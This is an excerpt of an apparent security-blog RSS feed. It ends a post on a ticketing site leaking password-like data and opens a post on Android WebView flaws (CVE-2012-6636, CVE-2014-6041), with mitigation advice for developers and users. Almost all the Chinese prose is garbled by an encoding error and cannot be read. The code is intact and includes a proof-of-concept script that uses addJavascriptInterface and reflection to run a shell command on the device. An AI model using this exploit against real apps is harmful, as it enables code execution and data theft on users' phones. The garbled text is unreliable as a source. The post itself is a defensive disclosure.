&lt;p&gt;‰∏ÄÂÄãÁ∂ìÈ©óË±êÂØåÁöÑÈß≠ÂÆ¢ÔºåÈÄöÂ∏∏ÂÖâÁúãÈ¶ñÈ†ÅÂ∞±ËÉΩÂ§†Âà§Êñ∑Ë©≤Á∂≤Á´ôÊòØÂê¶ÂèØËÉΩÂ≠òÊúâÊºèÊ¥ûÔºåÊÜëËóâÁöÑÂ∞±ÊòØÈÄô‰∫õËõõÁµ≤È¶¨Ë∑°„ÄÇÁÇ∫‰∫Ü‰∏çËÆìËá™ÂÆ∂Á∂≤Á´ôÂ∏∏Ë¢´Ë∑ØÈÅéÁöÑÊÉ°ÊÑè‰ΩøÁî®ËÄÖÊîªÊìäÔºåÂä†Âº∑Á∂≤È†ÅÂâçÁ´ØÁöÑÂëàÁèæ„ÄÅÁ∂≤È†ÅÂéüÂßãÁ¢º‰πæÊ∑®ÊúâÊû∂Êßã„ÄÅÊ≤íÊúâÂ§™Â§öË≥áË®äÊ¥©ÊºèÔºåÈÄô‰∫õÈÉΩÊòØÂæàÂ•ΩÁöÑÈò≤Á¶¶ÊñπÊ≥ï„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÁµêË´ñ&quot;&gt;ÁµêË´ñ&lt;/h3&gt;

&lt;p&gt;Âú®‰ΩøÁî®ÊúÄËøëÁÜ±ÈñÄÁöÑÂØ¨ÂÆèÂîÆÁ•®Á∂≤Á´ôÊôÇÔºåÊàëÂÄëÁôºÁèæÁ∂≤È†ÅÂéüÂßãÁ¢ºÂ≠òÂú®‰∏Ä‰∫õÁñë‰ººÂØÜÁ¢ºÁöÑË≥áË®ä„ÄÇÂæûÈÄô‰ª∂‰∫ãÊÉÖÂá∫ÁôºÔºåÊàëÂÄëÂàÜÂà•Âª∂‰º∏Êé¢Ë®é‰∫ÜÂÖ©ÂÄãÂ∑•Á®ãÂ∏´ÊáâË©≤Ê≥®ÊÑèÁöÑË≠∞È°åÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Á¨¨‰∏ÄÂÄãË≠∞È°åÊèêÈÜíÂ§ßÂÆ∂Âú®ÈñãÁôºÁöÑÊôÇÂÄôÔºåÈáçË¶ÅÁöÑË≥áË®äÂçÉËê¨‰∏çË¶ÅÈÄèÈÅéÂÆ¢Êà∂Á´ØÁÄèË¶ΩÂô®Âπ´ÂøôËΩâÈÄÅÔºåË®ò‰ΩèÂÆ¢Êà∂Á´ØÈÉΩÊòØ‰∏çÂèØ‰ø°ÁöÑÔºåÂ§öÁ∂ì‰∏ÄÊâãÂ∞±Â§ö‰∏ÄÂàÜÈ¢®Èö™„ÄÇÊñá‰∏≠ËàâÂá∫‰∫ÜÂè∞ÁÅ£ÈõªÂïÜÁ∂≤Á´ôÂú®ÈáëÊµÅ‰∏≤Êé•ÊôÇ‰πüÂ∏∏Âá∫ÁèæÈÄôÊ®£ÁöÑÂïèÈ°åÔºåÂèØËÉΩÊúÉÈÄ†ÊàêË®ÇÂñÆÈáëÈ°çË¢´Á´ÑÊîπÁ≠â‰ºÅÊ•≠ÊúÉÊúâÊâÄÊêçÂ§±ÁöÑÂïèÈ°å„ÄÇ&lt;/li&gt;
  &lt;li&gt;Á¨¨‰∫åÂÄãË≠∞È°åÂæûÈß≠ÂÆ¢ÁöÑÂøÉÁêÜ‰æÜË´áË≥áÂÆâÔºå‰∏ÄÂÄãÁ∂≤Á´ôÂ¶ÇÊûúÊ≤íÊúâ‰ªÄÈ∫º‰øùË≠∑Ê©üÂà∂„ÄÅËºïÊòìÁöÑÊ¥©ÊºèÁ∂≤Á´ôË≥áË®äÔºåÈùûÂ∏∏ÂÆπÊòìÊåëËµ∑Èß≠ÂÆ¢ÊÉ≥Ë¶ÅÂòóË©¶ÂÖ•‰æµÁöÑÊÖæÊúõÔºõÂèç‰πãÔºåËã•‰∏ÄÂÄãÁ∂≤Á´ôÂæûÂâçÁ´ØÂà∞‰ΩøÁî®ÊµÅÁ®ãÈÉΩÈùûÂ∏∏Ê≥®ÊÑèÁ¥∞ÁØÄÔºå‰∏ÄËà¨Èß≠ÂÆ¢ËºÉÊúÉËààËá¥Áº∫Áº∫„ÄÇÂö¥Ë¨πÁöÑÂâçÁ´ØÂëàÁèæÔºåÂ∞±ÊüêÁ®ÆÁ®ãÂ∫¶‰æÜË™™Ôºå‰πüÊòØ‰∏ÄÁ®ÆÂ∞çËá™Ë∫´Á∂≤Á´ôÁöÑ‰øùË≠∑„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Â∏åÊúõÈñãÁôºËÄÖÁúãÂà∞‰∏äÈù¢ÈÄôÂÖ©ÂÄãË≠∞È°åÊúâÊéåÊè°Âà∞„ÄéÂà•Áõ∏‰ø°ÂÆ¢Êà∂Á´Ø„Äè„ÄÅ„ÄéÈß≠ÂÆ¢ÊúÉÂõ†Á∂≤Á´ôÂâçÁ´ØÂØ´Ê≥ï‰∏çÂö¥Ë¨πËÄåÂòóË©¶ÂéªÊîªÊìä„ÄèÁöÑÈáçÈªûÔºåÊèêÊòáËá™ÂÆ∂Á∂≤Á´ôÁöÑÂÆâÂÖ®Â∫¶ÂêßÔºÅ&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåË™™ÂÄãÈ°åÂ§ñË©±ÔºåË∫´ÁÇ∫‰∏ÄÂÄãÂ∑•Á®ãÂ∏´ÔºåÊàëË™çÁÇ∫Ë≥áË®äÁ≥ªÁµ±Ë©≤Â∏∂Áµ¶‰∏ñÁïåÁöÑÂ•ΩËôïÊòØÁØÄÁúÅÂ§ßÂÆ∂ÁöÑÊôÇÈñìÔºåËÄåÈÄôÊ¨°Êê∂Á•®ÂçªËÆìÁÑ°Êï∏‰∫∫ÂæπÂ§úÊéíÈöäÊàñÂÆàÂú®ÈõªËÖ¶Ââç‰∏çÊñ∑ÁöÑ„ÄéÈÄ£‰∏ç‰∏ä„ÄÅË≤∑Á•®„ÄÅÂ§±Êïó„ÄèÂæ™Áí∞„ÄÇÈÄô‰πüË®±ËÉΩÂ§†Ë≥∫Âà∞Â§ßÈáèÁöÑÊñ∞ËÅûÁâàÈù¢ÔºåÊúÄÁµÇÁ•®‰πüËÉΩÂÖ®ÈÉ®Ë≥£ÂÖâÔºå‰ΩÜÊÉ≥Âà∞Âè∞ÁÅ£ÊúâÊï∏ÂçÅËê¨Â∞èÊôÇÁöÑÁîüÁî¢ÂäõÊµ™Ë≤ªÂú®ÁÑ°ÊÑèÁæ©ÁöÑÁ≠âÂæÖ‰∏äÔºåÂ∞±Ë¶∫ÂæóÈÄôÂÄãÁ≥ªÁµ±Â•ΩÂ§±Êïó„ÄÇÁèæÂú®ÁöÑÊäÄË°ìÂ∑≤Á∂ìÂèØ‰ª•Ë≤†Ëç∑ÈÄôÊ®£Â§ßË¶èÊ®°ÁöÑÂîÆÁ•®Ôºå&lt;a href=&quot;https://kktix.com/&quot;&gt;KKTIX&lt;/a&gt; ÁîöËá≥ÂèØ‰ª•&lt;a href=&quot;https://medium.com/@hlb/kktix-2015-01-7bf84c47dfdf&quot;&gt;‰∏ÄÂàÜÈêòËôïÁêÜ 10 Ëê¨ÂºµÂäÉ‰ΩçÁ•®Âà∏&lt;/a&gt;ÔºÅ‰∏ñÁïåÂú®ÈÄ≤Ê≠•ÔºåÈÅéÂéªÁöÑÊäÄË°ì‰πüË®±Â∞±Ë©≤ËÆìÂÆÉÁïôÂú®ÈÅéÂéª„ÄÇÊúâ‰∫∫Ë™™Ôºö„ÄéÁúüÊ≠£Âπ∏Á¶èÁöÑ‰∫∫Ôºö‰∏çÊòØÊê∂Âà∞Á•®ÔºåÊòØÂèØ‰ª•ÂÉèÊ±üËïô‰∏ÄÊ®£ÈÅ∏Êìá‰∫∫Áîü„ÄèÔºåÂ∏åÊúõÊàë‰πüÂèØ‰ª•ËÆäÊàê‰∏ÄÂÄãÂπ∏Á¶èÁöÑ‰∫∫ÔºåÂèØ‰ª•ÈÅ∏Êìá‰∏ÄÂÄã‰∏çÂ°ûËªäÁöÑÂîÆÁ•®Á≥ªÁµ±„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2015/01/09/information-security-insight-kham/</link>
                <guid>https://devco.re/blog/2015/01/09/information-security-insight-kham</guid>
                <pubDate>Fri, 09 Jan 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Android WebView ÁÇ∫‰Ω†ÁöÑ‰ΩøÁî®ËÄÖÊâìÈñã‰∫ÜÊºèÊ¥û‰πãÈñÄ‰Ω†Áü•ÈÅìÂóéÔºü</title>
                <description>&lt;p&gt;ÁÇ∫‰∫ÜËß£Ê±∫Âú®ÊáâÁî®Á®ãÂºè‰∏≠È°ØÁ§∫Á∂≤È†ÅÁöÑÈúÄÊ±ÇÔºåÈñãÁôºËÄÖ‰∏ÄËà¨ÊúÉ‰ΩøÁî®Âà∞Áî±Á≥ªÁµ±Êèê‰æõÁöÑ WebView ÂÖÉ‰ª∂„ÄÇËÄåÁî±Êñº JavaScript Ë¢´Âª£Ê≥õÊáâÁî®Âú®Á∂≤È†Å‰∏äÔºåÈñãÁôºËÄÖÈÄöÂ∏∏‰πüÊúÉÊää WebView ËôïÁêÜ JavaScript ÁöÑÂäüËÉΩÊâìÈñãÔºåÂ•ΩËÆìÂ§ßÈÉ®ÂàÜÁ∂≤È†ÅËÉΩÊ≠£Â∏∏ÈÅã‰Ωú„ÄÇ‰ΩÜÂ∞±Âú®ÈñãÂïüÈÄôÂÄãÂÉèÊòØÂøÖ‰∏çÂèØÂ∞ëÁöÑ JavaScript ÂäüËÉΩÊôÇÔºåËÉåÂæå‰∏Ä‰∫õÁî±ÊñºÁ≥ªÁµ±ÊºèÊ¥ûËÄåÂºïÁôºÂá∫‰æÜÊÑèÊÉ≥‰∏çÂà∞ÁöÑÈ¢®Èö™ÂçªÊúâÊ©üÊúÉÁî±Ê≠§ËÄåÁîü„ÄÇÊé•‰∏ã‰æÜÁöÑÈÉ®ÂàÜÂ∞áÊääÈÄô‰∫õÊºèÊ¥ûÁÇ∫Â§ßÂÆ∂ÂÅöÂÄãÊï¥ÁêÜ„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;Áõ∏ÈóúÊºèÊ¥û&quot;&gt;Áõ∏ÈóúÊºèÊ¥û&lt;/h3&gt;

&lt;h4 id=&quot;1-ÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°å-remote-code-execution&quot;&gt;1. ÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°å (Remote Code Execution)&lt;/h4&gt;

&lt;h5 id=&quot;È¢®Èö™Êú®È¶¨Ë∑≥ÊùøÂÄãË≥áË¢´Áõú&quot;&gt;È¢®Èö™ÔºöÊú®È¶¨Ë∑≥ÊùøÔºåÂÄãË≥áË¢´Áõú&lt;/h5&gt;
&lt;p&gt;ÁõÆÂâçÊúâÊ©üÊúÉÁôºÁîü RCE È¢®Èö™ÈÉΩÂúçÁπûÂú® &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; ÈÄôÂÄãÂäüËÉΩ‰∏äÔºåË©≤ÂäüËÉΩÂéüÊÑèÊòØÁÇ∫Ë¢´ËºâÂÖ•ÁöÑÁ∂≤È†ÅÂíåÂéüÁîüÁ®ãÂºèÈñìÂª∫Á´ã‰∏ÄÂÄã‚ÄùÊ©ãÊ®ë‚ÄùÔºåÈÄöÈÅéÈ†êÂÖàË®≠ÂÆöÂ•ΩÁöÑ‰ªãÈù¢ÔºåËÆìÁ∂≤È†ÅËÉΩÂëºÂè´ÊåáÂÆöÁöÑÂÖ¨ÈñãÂáΩÂºè‰∏¶ÂèñÂæóÂáΩÂºèÂõûÂÇ≥ÁöÑÁµêÊûú„ÄÇ&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JsObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hello World&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSettings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setJavaScriptEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addJavascriptInterface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JsObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;injectedObject&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadUrl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.example.com/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;‚Ä¶
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// return &quot;Hello World&quot;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;‚Ä¶&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÂÉè‰∏äÈù¢ÁöÑ‰æãÂ≠êË£°ÔºåÁ∂≤È†ÅËÉΩÈÄöÈÅéÈ†êÂÖàË®≠ÂÆöÂ•ΩÁöÑ ‚ÄúinjectedObject‚Äù ‰ªãÈù¢ÔºåÂëºÂè´ ‚ÄútoString‚Äù ÂáΩÂºèÔºåÂæóÂà∞ ‚ÄúHello World‚Äù ÈÄôÂÄãÂ≠ó‰∏≤„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂÖ∂ÊºèÊ¥û &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6636&quot;&gt;CVE-2012-6636&lt;/a&gt; ÊúÄÊó©Âú®2012Âπ¥12ÊúàË¢´&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;ÂÖ¨‰Ωà&lt;/a&gt;Âá∫‰æÜÔºåÊîªÊìäËÄÖÊúâÊ©üÊúÉÂà©Áî®‰ªñÈÄöÈÅé Java Reflection API ‰æÜÂü∑Ë°å‰ªªÊÑè‰ª£Á¢º„ÄÇÂΩ±Èüø Android 1.X ~ 4.1„ÄÇ&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;java.lang.Runtime&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/system/bin/sh&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cat vuln &amp;gt;&amp;gt; attacker.txt&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÂÖ∂Âæå Google Âú® Android 4.2 ÈñãÂßãÂ∞ç &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; ÁöÑ‰ΩøÁî®ÊñπÂºèÂä†‰∫ÜÈôêÂà∂Ôºå‰ΩøÁî®ÊôÇÈúÄË¶ÅÂú® Java Á´ØÊääÂèØË¢´Á∂≤È†ÅÂü∑Ë°åÁöÑÂÖ¨ÈñãÂáΩÂºèÈÄèÈÅé @JavascriptInterface ‰æÜÊ®ôË®ª„ÄÇ‰∏¶Â•âÂã∏ÈñãÁôºËÄÖÂà•Âú® 4.1 Êàñ‰πãÂâçÁöÑÁ≥ªÁµ±‰∏ä‰ΩøÁî® &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂèØÊòØÊòØÂê¶ÈñãÁôºËÄÖÂè™Ë¶ÅÂú®ÂèóÂΩ±ÈüøÁöÑÁ≥ªÁµ±‰∏ä‰∏ç‰∏ªÂãï‰ΩøÁî® &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; Â∞±ËÉΩËß£Ê±∫ÂïèÈ°åÂë¢ÔºüÁ≠îÊ°àÊòØÂê¶ÂÆöÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;Âú® Android 3.X ~ 4.1 ‰∏äÔºåWebView È†êË®≠ÊúÉÁî® &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; Ê∑ªÂä†‰∏ÄÂÄãÂè´ ‚ÄúsearchBoxJavaBridge_‚Äù ÁöÑ‰ªãÈù¢„ÄÇÈñãÁôºËÄÖÂ¶ÇÊûúÊ≤íÊúâÊ≥®ÊÑèÁöÑË©±Â∞±ÊúÉÂêåÊ®£ÊúÉËÆì‰ΩøÁî®ËÄÖÈô∑ÂÖ•È¢®Èö™‰∏≠„ÄÇÂæàÂ∑ßÂêàÂú∞ÔºåÂæû Android 3.0 ÈñãÂßã Google Âä†ÂÖ•‰∫Ü &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; ÂáΩÂºèËÆìÈñãÁôºËÄÖÂèØ‰ª•ÁßªÂÆöÊåáÂÆöÁöÑ‰ªãÈù¢„ÄÇÊâÄ‰ª•ÈñãÁôºËÄÖÂèØ‰ª•‰ΩøÁî®Ë©≤ÂáΩÂºèÂú®ÂèóÂΩ±ÈüøÁöÑÁ≥ªÁµ±‰∏äÊää ‚ÄúsearchBoxJavaBridge_‚Äù ÁßªÈô§„ÄÇ&lt;/p&gt;

&lt;p&gt;Èô§‰∫Ü ‚ÄúsearchBoxJavaBridge_‚Äù Â§ñÔºåÈÇÑÊúâÂÖ©ÂÄã‰ªãÈù¢ÊúÉÂú®ÁâπÂÆöÊÉÖÊ≥Å‰∏ãË¢´Âä†Âà∞ WebView ‰∏≠„ÄÇËã•‰ΩøÁî®ËÄÖÊúâÂú®ÊâãÊ©ü‰∏ä [Á≥ªÁµ±Ë®≠ÂÆö] Ë£°ÁöÑ [ÂçîÂä©Â∑•ÂÖ∑]ÔºåÊâìÈñã [ÊúçÂãô] Â≠êÂàÜÈ°û‰∏≠ÁöÑ‰ªª‰Ωï‰∏ÄÂÄãÈ†ÖÁõÆÔºåÁ≥ªÁµ±Â∞±ÊúÉÂ∞çÂÖ∂ÂæåÂª∫Á´ãÁöÑ WebView Ëá™ÂãïÂä†‰∏ä ‚Äúaccessibility‚Äù Âíå ‚ÄúaccessibilityTraversal‚ÄùÈÄôÂÖ©ÂÄã‰ªãÈù¢„ÄÇÈÄôË°åÁÇ∫Âú® Android 4.4 Áî±Êñº&lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/94c0057d67c2e0a4b88a4f735388639210260d0e&quot;&gt;ËàäÁâà WebView Ë¢´Âèñ‰ª£&lt;/a&gt;ËÄåÊ∂àÂ§±‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_accessibility_service.png&quot; alt=&quot;Android ÂçîÂä©Â∑•ÂÖ∑ÊúçÂãô&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Èò≤ÁØÑ&quot;&gt;Èò≤ÁØÑ&lt;/h4&gt;

&lt;p&gt;‰ΩúÁÇ∫ÈñãÁôºËÄÖ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Â¶ÇÈùûÈúÄË¶ÅÔºåÈóúÈñâ JavaScript ÂäüËÉΩ (È†êË®≠ÈóúÈñâ)&lt;/li&gt;
  &lt;li&gt;ÂèØËÄÉÊÖÆÊääÁ∂≤È†ÅÁï∂‰ΩúÁØÑÊú¨ÂÑ≤Â≠òÂú®ÊáâÁî®ÂÖßÔºåÂÜçÁî®ÂÖ∂‰ªñÈÄîÂæëËºâÂÖ•Ë≥áÊñô&lt;/li&gt;
  &lt;li&gt;Âú®ÊúâÈ¢®Èö™ÁöÑÁ≥ªÁµ±‰∏≠ÂÅúÁî® &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Âú®ÊúâÈ¢®Èö™ÁöÑÁ≥ªÁµ±‰∏≠‰ΩøÁî® &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; ÁßªÈô§Á≥ªÁµ±Ëá™Â∏∂ÁöÑ‰ªãÈù¢&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰ΩúÁÇ∫‰ΩøÁî®ËÄÖ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Â¶ÇÈùûÈúÄË¶ÅÔºåÈóúÈñâ [‰∏çÊòéÁöÑ‰æÜÊ∫ê] ÈÅ∏È†Ö (È†êË®≠ÈóúÈñâ)&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî® Android 4.2 Êàñ‰ª•‰∏ä‰∏çÂèóÂΩ±ÈüøÁöÑÁ≥ªÁµ±&lt;/li&gt;
  &lt;li&gt;ÂãøÂú®ÂèóÂΩ±ÈüøÁöÑÁ≥ªÁµ±‰∏ä‰ΩøÁî®Ê©üÊïèÊúçÂãôÊàñÂÑ≤Â≠òÊ©üÊïèË≥áÊñô&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_unknown_source.png&quot; alt=&quot;Android ‰∏çÊòéÁöÑ‰æÜÊ∫ê&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;2-ÁπûÈÅéÂêåÊ∫êÁ≠ñÁï•-same-origin-policy-bypass&quot;&gt;2. ÁπûÈÅéÂêåÊ∫êÁ≠ñÁï• (Same-Origin Policy bypass)&lt;/h4&gt;

&lt;h5 id=&quot;È¢®Èö™ÂÄãË≥áË¢´Áõú&quot;&gt;È¢®Èö™ÔºöÂÄãË≥áË¢´Áõú&lt;/h5&gt;
&lt;p&gt;ÁÇ∫Èò≤Ê≠¢Á∂≤È†ÅÂú®ËºâÂÖ•Â§ñÈÉ®Ë≥áÊ∫êÊôÇÂºïÁôºÂÆâÂÖ®ÂïèÈ°åÔºåÁÄèË¶ΩÂô®ÊúÉÂØ¶‰Ωú&lt;a href=&quot;https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Same_origin_policy_for_JavaScript&quot;&gt;ÂêåÊ∫êÁ≠ñÁï•&lt;/a&gt;‰ª•ÈôêÂà∂Á®ãÂºèÁ¢ºÂíå‰∏çÂêåÁ∂≤ÂüüË≥áÊ∫êÈñìÁöÑ‰∫íÂãï„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂÖ∂‰∏≠ &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6041&quot;&gt;CVE-2014-6041&lt;/a&gt; ÊºèÊ¥ûÔºåÈÄöÈÅéÁ®ãÂºèÂú®ËôïÁêÜ \u0000 (unicode null byte) ÊôÇÁöÑÂ§±Ë™§ËÄåÁπûÈÅé‰∫ÜÂéüÊúâÁöÑÈôêÂà∂„ÄÇ&lt;/p&gt;

